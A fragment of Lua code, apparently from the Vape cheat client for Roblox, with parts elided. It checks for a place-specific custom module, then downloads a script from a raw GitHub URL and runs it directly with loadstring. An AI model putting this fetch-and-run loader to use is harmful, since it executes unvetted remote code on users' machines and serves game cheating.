	...
	if not shared.VapeIndependent then
		...
		if isfile("vape/CustomModules/"..game.PlaceId..".lua") then
			...
			if not shared.VapeDeveloper then
				local suc, publicrepo = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/afkbotting/sdsdadsada/main/insta.lua") end)
				if suc and publicrepo and publicrepo ~= "404: Not Found" then
					...
					loadstring(game:HttpGet("https://raw.githubusercontent.com/afkbotting/sdsdadsada/main/insta.lua", true))()
				end
			end
		end
		if shared.VapePrivate then
